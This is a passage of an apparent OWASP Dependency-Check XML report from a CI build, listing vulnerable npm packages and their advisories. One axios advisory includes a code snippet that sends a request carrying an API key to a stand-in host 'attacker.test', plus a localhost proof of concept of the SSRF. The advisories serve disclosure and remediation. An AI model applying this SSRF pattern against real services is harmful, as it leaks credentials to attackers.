<?xml version="1.0"?><analysis xmlns="https://jeremylong.github.io/DependencyCheck/dependency-check.4.1.xsd"><scanInfo><engineVersion>12.1.3</engineVersion><dataSource><name>NVD API Last Checked</name><timestamp>2025-07-25T21:20:32Z</timestamp></dataSource><dataSource><name>NVD API Last Modified</name><timestamp>2025-07-25T21:15:28Z</timestamp></dataSource><analysisExceptions><exception><message>org.owasp.dependencycheck.analyzer.exception.SearchException: Could not perform Node Audit analysis. Invalid payload submitted to Node Audit API.</message><stackTrace><trace>org.owasp.dependencycheck.data.nodeaudit.NodeAuditSearch.submitPackage(NodeAuditSearch.java:199)</trace><trace>org.owasp.dependencycheck.data.nodeaudit.NodeAuditSearch.submitPackage(NodeAuditSearch.java:135)</trace><trace>org.owasp.dependencycheck.analyzer.NodeAuditAnalyzer.analyzePackage(NodeAuditAnalyzer.java:189)</trace><trace>org.owasp.dependencycheck.analyzer.NodeAuditAnalyzer.analyzeDependency(NodeAuditAnalyzer.java:146)</trace><trace>org.owasp.dependencycheck.analyzer.AbstractAnalyzer.analyze(AbstractAnalyzer.java:131)</trace><trace>org.owasp.dependencycheck.AnalysisTask.call(AnalysisTask.java:88)</trace><trace>org.owasp.dependencycheck.AnalysisTask.call(AnalysisTask.java:37)</trace><trace>java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)</trace><trace>java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)</trace><trace>java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)</trace><trace>java.base/java.lang.Thread.run(Thread.java:840)</trace></stackTrace><cause><message>org.owasp.dependencycheck.utils.DownloadFailedException: https://registry.npmjs.org/-/npm/v1/security/audits - Server status: 400 - Server reason: Bad Request</message><stackTrace><trace>org.owasp.dependencycheck.utils.Downloader.wrapAndThrowHttpResponseException(Downloader.java:438)</trace><trace>org.owasp.dependencycheck.utils.Downloader.postBasedFetchContent(Downloader.java:549)</trace><trace>org.owasp.dependencycheck.data.nodeaudit.NodeAuditSearch.submitPackage(NodeAuditSearch.java:165)</trace><trace>org.owasp.dependencycheck.data.nodeaudit.NodeAuditSearch.submitPackage(NodeAuditSearch.java:135)</trace><trace>org.owasp.dependencycheck.analyzer.NodeAuditAnalyzer.analyzePackage(NodeAuditAnalyzer.java:189)</trace><trace>org.owasp.dependencycheck.analyzer.NodeAuditAnalyzer.analyzeDependency(NodeAuditAnalyzer.java:146)</trace><trace>org.owasp.dependencycheck.analyzer.AbstractAnalyzer.analyze(AbstractAnalyzer.java:131)</trace><trace>org.owasp.dependencycheck.AnalysisTask.call(AnalysisTask.java:88)</trace><trace>org.owasp.dependencycheck.AnalysisTask.call(AnalysisTask.java:37)</trace><trace>java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)</trace><trace>java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)</trace><trace>java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)</trace><trace>java.base/java.lang.Thread.run(Thread.java:840)</trace></stackTrace><cause><message>org.apache.hc.client5.http.HttpResponseException: status code: 400, reason phrase: Bad Request</message><stackTrace><trace>org.apache.hc.client5.http.impl.classic.AbstractHttpClientResponseHandler.handleResponse(AbstractHttpClientResponseHandler.java:69)</trace><trace>org.apache.hc.client5.http.impl.classic.BasicHttpClientResponseHandler.handleResponse(BasicHttpClientResponseHandler.java:72)</trace><trace>org.apache.hc.client5.http.impl.classic.BasicHttpClientResponseHandler.handleResponse(BasicHttpClientResponseHandler.java:55)</trace><trace>org.apache.hc.client5.http.impl.classic.CloseableHttpClient.execute(CloseableHttpClient.java:247)</trace><trace>org.apache.hc.client5.http.impl.classic.CloseableHttpClient.execute(CloseableHttpClient.java:188)</trace><trace>org.owasp.dependencycheck.utils.Downloader.postBasedFetchContent(Downloader.java:544)</trace><trace>org.owasp.dependencycheck.data.nodeaudit.NodeAuditSearch.submitPackage(NodeAuditSearch.java:165)</trace><trace>org.owasp.dependencycheck.data.nodeaudit.NodeAuditSearch.submitPackage(NodeAuditSearch.java:135)</trace><trace>org.owasp.dependencycheck.analyzer.NodeAuditAnalyzer.analyzePackage(NodeAuditAnalyzer.java:189)</trace><trace>org.owasp.dependencycheck.analyzer.NodeAuditAnalyzer.analyzeDependency(NodeAuditAnalyzer.java:146)</trace><trace>org.owasp.dependencycheck.analyzer.AbstractAnalyzer.analyze(AbstractAnalyzer.java:131)</trace><trace>org.owasp.dependencycheck.AnalysisTask.call(AnalysisTask.java:88)</trace><trace>org.owasp.dependencycheck.AnalysisTask.call(AnalysisTask.java:37)</trace><trace>java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)</trace><trace>java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)</trace><trace>java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)</trace><trace>java.base/java.lang.Thread.run(Thread.java:840)</trace></stackTrace></cause></cause></exception></analysisExceptions></scanInfo><projectInfo><name>wanderlust-CI #16</name><reportDate>2025-07-25T22:02:49.500717493Z</reportDate><credits>This product uses the NVD API but is not endorsed or certified by the NVD. This report contains data retrieved from the National Vulnerability Database: https://nvd.nist.gov, Github Advisory Database (via NPM Audit API): https://github.com/advisories/, and the RetireJS community.</credits></projectInfo><dependencies><dependency isVirtual="true"><fileName>@babel/helpers:7.23.6</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?@babel/helpers</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>@babel/helpers</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>@babel/helpers</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>7.23.6</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/%40babel%2Fhelpers@7.23.6</id><url>https://ossindex.sonatype.org/component/pkg:npm/%40babel%2Fhelpers@7.23.6?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="NPM"><name>GHSA-968p-4wvh-cqc8</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.199999809265137</baseScore><attackVector>LOCAL</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-1333</cwe></cwes><description>### Impact

When using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).

Your generated code is vulnerable if _all_ the following conditions are true:
- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)
- You use the `.replace` method on a regular expression that contains named capturing groups
- **Your code uses untrusted strings as the second argument of `.replace`**

If you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:
- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23
- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10

You can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).


### Patches

This problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It&apos;s likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.

Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.

### Workarounds

If you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$&lt;` if it&apos;s then not followed by `&gt;` (possibly with other characters in between).

### References

This vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-968p-4wvh-cqc8</url><name>https://github.com/advisories/GHSA-968p-4wvh-cqc8</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</url><name>https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</url><name>https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-27789</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-27789</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/babel/babel/pull/17173</url><name>https://github.com/babel/babel/pull/17173</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:\@babel\/helpers:\&lt;7.26.10:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="true"><fileName>@babel/runtime:7.23.2</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?@babel/runtime</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>@babel/runtime</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>@babel/runtime</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>7.23.2</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/%40babel%2Fruntime@7.23.2</id><url>https://ossindex.sonatype.org/component/pkg:npm/%40babel%2Fruntime@7.23.2?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="NPM"><name>GHSA-968p-4wvh-cqc8</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.199999809265137</baseScore><attackVector>LOCAL</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-1333</cwe></cwes><description>### Impact

When using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).

Your generated code is vulnerable if _all_ the following conditions are true:
- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)
- You use the `.replace` method on a regular expression that contains named capturing groups
- **Your code uses untrusted strings as the second argument of `.replace`**

If you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:
- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23
- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10

You can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).


### Patches

This problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It&apos;s likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.

Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.

### Workarounds

If you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$&lt;` if it&apos;s then not followed by `&gt;` (possibly with other characters in between).

### References

This vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-968p-4wvh-cqc8</url><name>https://github.com/advisories/GHSA-968p-4wvh-cqc8</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</url><name>https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</url><name>https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-27789</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-27789</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/babel/babel/pull/17173</url><name>https://github.com/babel/babel/pull/17173</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:\@babel\/runtime:\&lt;7.26.10:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>auth-controller.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/controllers/auth-controller.js</filePath><md5>57a3b1cd92f7bdf954bf3ee396834aa9</md5><sha1>786d3299e60ca04c9d9b64c783e83dfc45de758e</sha1><sha256>d1d91207a822c85b4009376ff7fc429fa316fcf44565a01f56d40ac7a81a20eb</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>auth.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/routes/auth.js</filePath><md5>17fadd7e02ce3b11bea0af6f3eab23de</md5><sha1>a1666e0b1e0c2b719a76db0a6c0e66db7de37901</sha1><sha256>307668d37ccfac1c5fdb6fcede130f3a5d34327555b36cb08614782afe2fba4e</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>axios:1.6.1</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?axios</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>axios</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>axios</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>1.6.1</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/axios@1.6.1</id><url>https://ossindex.sonatype.org/component/pkg:npm/axios@1.6.1?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-39338</name><severity>HIGH</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-918</cwe></cwes><description>axios 1.7.2 allows SSRF via unexpected behavior where requests for path relative URLs get processed as protocol relative URLs.</description><references><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-39338</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-39338</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</url><name>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-39338?component-type=npm&amp;component-name=axios&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-39338] CWE-918: Server-Side Request Forgery (SSRF)</name></reference><reference><source>OSSIndex</source><url>https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</url><name>https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:axios:1.6.1:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-8hc4-vh64-cxmj</name><severity unscored="true">high</severity><cwes><cwe>CWE-918</cwe></cwes><description>axios 1.7.2 allows SSRF via unexpected behavior where requests for path relative URLs get processed as protocol relative URLs.</description><references><reference><source>NPM Advisory reference: </source><url>https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</url><name>https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-39338</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-39338</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a</url><name>https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</url><name>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/pull/6543</url><name>https://github.com/axios/axios/pull/6543</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/releases/tag/v1.7.4</url><name>https://github.com/axios/axios/releases/tag/v1.7.4</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/releases</url><name>https://github.com/axios/axios/releases</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/pull/6539</url><name>https://github.com/axios/axios/pull/6539</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/issues/6463</url><name>https://github.com/axios/axios/issues/6463</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:axios:\&gt;\=1.3.2\&lt;\=1.7.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-jr5f-v2jv-69x6</name><severity unscored="true">high</severity><cwes><cwe>CWE-918</cwe></cwes><description>### Summary

A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).
Reference: axios/axios#6463

A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.

### Details

Consider the following code snippet:

```js
import axios from &quot;axios&quot;;

const internalAPIClient = axios.create({
  baseURL: &quot;http://example.test/api/v1/users/&quot;,
  headers: {
    &quot;X-API-KEY&quot;: &quot;1234567890&quot;,
  },
});

// const userId = &quot;123&quot;;
const userId = &quot;http://attacker.test/&quot;;

await internalAPIClient.get(userId); // SSRF
```

In this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.

It is recommended that:

-	When `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.
-	Before sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.

### PoC

Follow the steps below to reproduce the issue:

1.	Set up two simple HTTP servers:

```
mkdir /tmp/server1 /tmp/server2
echo &quot;this is server1&quot; &gt; /tmp/server1/index.html 
echo &quot;this is server2&quot; &gt; /tmp/server2/index.html
python -m http.server -d /tmp/server1 10001 &amp;
python -m http.server -d /tmp/server2 10002 &amp;
```


2.	Create a script (e.g., main.js):

```js
import axios from &quot;axios&quot;;
const client = axios.create({ baseURL: &quot;http://localhost:10001/&quot; });
const response = await client.get(&quot;http://localhost:10002/&quot;);
console.log(response.data);
```

3.	Run the script:

```
$ node main.js
this is server2
```

Even though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.

### Impact

-	Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.
-	SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.
-	Affected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/pull/6829</url><name>https://github.com/axios/axios/pull/6829</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/releases/tag/v1.8.2</url><name>https://github.com/axios/axios/releases/tag/v1.8.2</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde</url><name>https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-jr5f-v2jv-69x6</url><name>https://github.com/advisories/GHSA-jr5f-v2jv-69x6</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-27152</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-27152</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6</url><name>https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/issues/6463</url><name>https://github.com/axios/axios/issues/6463</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f</url><name>https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:axios:\&gt;\=1.0.0\&lt;1.8.2:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="true"><fileName>brace-expansion:1.1.11</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?brace-expansion</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>brace-expansion</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>brace-expansion</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>1.1.11</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/brace-expansion@1.1.11</id><url>https://ossindex.sonatype.org/component/pkg:npm/brace-expansion@1.1.11?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2025-5889</name><severity>MEDIUM</severity><cvssV2><score>6.0</score><accessVector>NETWORK</accessVector><accessComplexity>HIGH</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>MEDIUM</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-1333</cwe></cwes><description>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is a5b98a4f30d7813266b221435e1eaaf25a1b0ac5. It is recommended to upgrade the affected component.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2025-5889?component-type=npm&amp;component-name=brace-expansion&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2025-5889] CWE-1333 CWE-400</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</url><name>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</name></reference><reference><source>OSSIndex</source><url>https://github.com/juliangruber/brace-expansion/pull/65</url><name>https://github.com/juliangruber/brace-expansion/pull/65</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-5889</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-5889</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:brace-expansion:1.1.11:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-v6h2-p8h4-qcjw</name><severity unscored="true">low</severity><cvssV3><baseScore>3.0999999046325684</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>LOW</availabilityImpact><baseSeverity>LOW</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-400</cwe></cwes><description>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</url><name>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</name></reference><reference><source>NPM Advisory reference: </source><url>https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</url><name>https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</name></reference><reference><source>NPM Advisory reference: </source><url>https://vuldb.com/?submit.585717</url><name>https://vuldb.com/?submit.585717</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-5889</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-5889</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</url><name>https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</url><name>https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</url><name>https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</name></reference><reference><source>NPM Advisory reference: </source><url>https://vuldb.com/?id.311660</url><name>https://vuldb.com/?id.311660</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</url><name>https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</name></reference><reference><source>NPM Advisory reference: </source><url>https://vuldb.com/?ctiid.311660</url><name>https://vuldb.com/?ctiid.311660</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</url><name>https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:brace-expansion:\&gt;\=1.0.0\&lt;\=1.1.11:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="true"><fileName>braces:3.0.2</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?braces</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>braces</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>braces</value></evidence><evidence type="version" 